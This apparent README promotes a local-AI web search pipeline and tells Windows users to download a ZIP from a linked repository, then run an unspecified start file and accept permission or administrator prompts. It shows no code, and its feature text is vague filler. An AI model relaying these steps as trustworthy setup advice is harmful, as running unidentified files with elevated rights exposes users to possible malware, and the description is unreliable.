# 🔎 production_rag_pipeline - Search the web with local AI

[![Download or View Project](https://img.shields.io/badge/Download%20%26%20Run-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Orelieindigestible768/production_rag_pipeline)

## 📥 Download

Use this link to visit the project page and download the files:

https://github.com/Orelieindigestible768/production_rag_pipeline

## 🪟 Windows Setup

1. Open the link above in your web browser.
2. On the GitHub page, look for the green **Code** button.
3. Click **Code**.
4. Click **Download ZIP**.
5. Save the ZIP file to your computer.
6. Right-click the ZIP file and choose **Extract All**.
7. Open the extracted folder.
8. Look for the app file, install script, or start script.
9. Double-click the file that starts the app.

If Windows asks for permission, choose **Yes**.

## ⚙️ What this app does

production_rag_pipeline helps you search the web and turn the results into a clean prompt for a local AI model.

It uses:
- Bing search
- DuckDuckGo search
- semantic filtering
- reranking
- citation-ready output

This makes it easier to ask a local LLM questions that need fresh web facts.

## ✨ Main features

- Search the web from one place
- Combine results from Bing and DuckDuckGo
- Remove weak or off-topic results
- Rank the best pages first
- Prepare text for a local LLM
- Add citations for the sources used
- Support for multilingual search
- Better results for research and fact lookup
- Works well with Ollama and other local LLM tools

## 🖥️ System requirements

For a smooth run on Windows, use a PC with:

- Windows 10 or Windows 11
- 8 GB RAM or more
- 2 GB free disk space
- A stable internet connection
- A modern web browser
- Python 3.10 or newer if you run from source
- Optional: a local LLM tool such as Ollama

If you plan to search larger topics or use bigger models, 16 GB RAM gives better results.

## 🚀 Getting started

1. Download the project from the link above.
2. Extract the ZIP file.
3. Open the project folder.
4. Find the start file.
5. Run the file.
6. Wait for the first setup to finish.
7. Open the app in your browser or desktop window.
8. Enter a question or topic.
9. Choose the search depth if the app offers that option.
10. Start the search.

## 🔍 How it works

The app follows a simple flow:

1. It searches Bing and DuckDuckGo.
2. It removes repeated or low-value pages.
3. It checks which pages match your question best.
4. It ranks the best pages near the top.
5. It builds a prompt for a local AI model.
6. It includes citations so you can trace where facts came from.

This helps the model use web results in a cleaner and more useful way.

## 🧠 Best use cases

Use this tool when you want:

- Current facts from the web
- Research help with source links
- Better answers than a plain search result page
- A prompt for a local AI model
- A way to compare many pages fast
- Search support for more than one language

## 📌 Example tasks

You can use it for questions like:

- What are the latest changes in a product?
- Which sources explain a topic best?
- What do several web pages say about the same issue?
- Can you gather citations for a local AI answer?
- Which search results are most useful for this question?

## 🧭 First run checklist

Before you start, check these items:

- The ZIP file is fully extracted
- You opened the right folder
- Your internet works
- Your browser is up to date
- Python is installed if you run source files
- You have permission to run files on your PC

If the app does not start, try opening the start file again from the extracted folder.

## 🛠️ If you run from source

If you prefer to run the project from source, use this basic flow:

1. Install Python.
2. Open the project folder.
3. Open Command Prompt in that folder.
4. Install the needed packages.
5. Start the app with the main entry file.

A common setup may include packages for:
- web requests
- search result parsing
- text extraction
- reranking
- sentence embeddings
- prompt building

## 🔗 Search and ranking tools

This project is built around common retrieval parts:

- **Bing** for broad web search
- **DuckDuckGo** for extra coverage
- **BM25** for text matching
- **semantic search** for meaning-based matching
- **cross-encoder reranking** for better result order
- **sentence-transformers** for embeddings
- **content extraction** for page text cleanup

These parts help the app find pages that match the question, not just the keywords.

## 📝 Citations

The output includes citations so you can:

- see where facts came from
- open the source pages
- check the result yourself
- reuse the prompt in a local LLM workflow

This is useful for research, writing, and fact checking.

## 🌍 Language support

The project supports multilingual search, so it can help with:

- English searches
- mixed-language queries
- non-English source pages
- cross-language topic lookups

This is useful when the best source is not in your own language.

## 🧩 Common issues

### The app does not open

- Make sure you extracted the ZIP file
- Run the app from the extracted folder
- Right-click and choose **Run as administrator** if needed
- Check if Windows blocked the file

### Search results look weak

- Try a clearer question
- Use fewer words
- Search for one topic at a time
- Add a more specific term
- Try another query in a different language

### The page text looks wrong

- The source page may block extraction
- Some sites use heavy scripts
- Try a different result
- Refresh and search again

### The local AI does not answer

- Check that your local LLM tool is running
- Make sure the model is loaded
- Check the app settings for the model path
- Try a smaller prompt

## 📦 What you get

A typical setup for this project includes:

- a search layer
- a page text extractor
- a ranking layer
- a prompt builder
- citation output
- local AI integration support

That gives you a search pipeline that is easier to use than copying web pages by hand.

## 🪄 Tips for better results

- Use short, direct questions
- Add the topic name in your search
- Try two or three word queries
- Use source names when you know them
- Ask one question at a time
- Compare the citations before you trust the answer

## 📁 Suggested folder view

After extraction, you may see files like:

- a main app file
- a requirements file
- a config file
- a README file
- a scripts folder
- a data or cache folder

Open the README file in the project folder if it is included there. It may contain start steps for that version.

## 🔐 Local use

This project is made for local AI workflows. That means you can keep the model on your machine and still use live web search for fresh context.

This setup works well when you want:
- more control
- local processing
- source links
- a search step before generation

## 📚 Project topics

This repository is tied to:

- web search
- information retrieval
- RAG
- reranking
- semantic search
- local LLMs
- Ollama
- NLP
- content extraction
- multilingual search

## ✅ Quick start

1. Visit the download page.
2. Download the project ZIP.
3. Extract it on Windows.
4. Open the folder.
5. Run the start file.
6. Enter a search query.
7. Review the citations.
8. Send the output to your local LLM

## 📎 Project link

https://github.com/Orelieindigestible768/production_rag_pipeline